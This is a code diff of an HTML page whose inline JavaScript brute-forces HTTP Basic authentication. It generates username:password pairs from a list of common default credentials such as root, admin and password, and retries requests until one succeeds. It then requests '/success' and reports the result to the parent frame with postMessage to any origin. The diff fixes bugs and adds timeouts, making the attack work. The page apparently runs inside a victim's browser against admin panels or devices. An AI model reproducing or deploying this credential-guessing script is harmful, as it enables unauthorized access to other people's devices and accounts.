@@ -1,18 +1,25 @@
 <!DOCTYPE>
-<html manifest="i.manifest">
+<html manifest="robots.txt">
 <head><title></title></head>
 <body>
 <script>
 (function () {
   if (location.hash) {
-  	return;
+    return;
   }
   var authList = makeAuthList();
   function PostMessage (message) {
-  	parent.postMessage(JSON.stringify(message), '*');
+    parent.postMessage(JSON.stringify(message), '*');
   }
   (function () {
     var xhr = new XMLHttpRequest();
+    if ('timeout' in xhr) {
+      xhr.timeout = 300;
+    } else {
+      setTimeout(function () {
+        xhr.abort();
+      }, 300);
+    }
     xhr.onreadystatechange = onreadystatechange;
     xhr.open('GET', '/');
     xhr.send();
@@ -22,16 +29,26 @@
       return;
     }
     var xhr = new XMLHttpRequest();
+    if ('timeout' in xhr) {
+      xhr.timeout = 300;
+    } else {
+      setTimeout(function () {
+        xhr.abort();
+      }, 300);
+    }
     xhr.onreadystatechange = onreadystatechange;
     xhr.open('GET', '/');
-    var auth = authList.splice(Math.random() * authList.length, 1);
+    var auth = authList.splice(Math.random() * authList.length | 0, 1);
     xhr.setRequestHeader('Authorization', 'Basic ' + btoa(auth));
     xhr.send();
   }
   function onreadystatechange () {
+    if (this.readyState !== 4) return;
     if (this.status === 401) return bruteforce();
     if (this.status !== 200) return PostMessage({'status' : this.status});
-    if (this.readyState !== 4) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/success');
+    xhr.send();
     PostMessage({
       'status' : this.status,
       'readyState' : this.readyState,
@@ -39,18 +56,18 @@
     });
   }
   function makeAuthList () {
-  	var baseAccount = ['1234','1234admin','root','adm','ADM','usr','USR', ''];
-  	var addAccount = ['admin', 'administorator', 'pass', 'passwd', 'password',
-  	  'manager', 'webadmin', 'user', 'userid', 'netadmin', 'superadmin',
-  	  'secret', 'secure', 'sysadm', 'operator', 'system', 'super'];
-  	var upCaseAccount = addAccount.reduce(function (base, item) {
+    var baseAccount = ['1234','1234admin','root','adm','ADM','usr','USR', ''];
+    var addAccount = ['admin', 'administorator', 'pass', 'passwd', 'password',
+      'manager', 'webadmin', 'user', 'userid', 'netadmin', 'superadmin',
+      'secret', 'secure', 'sysadm', 'operator', 'system', 'super'];
+    var upCaseAccount = addAccount.reduce(function (base, item) {
       return base.concat([item, item.toUpperCase(), item.replace(/^./, function (i) {
         return i.toUpperCase();
       })]);
     }, []);
     var targetAccount = baseAccount.concat(upCaseAccount);
     return targetAccount.reduce(function (base, item1) {
-      return base.concat(items.map(function (item2) {
+      return base.concat(targetAccount.map(function (item2) {
         return item1 + ':' + item2;
       }));
     }, []);
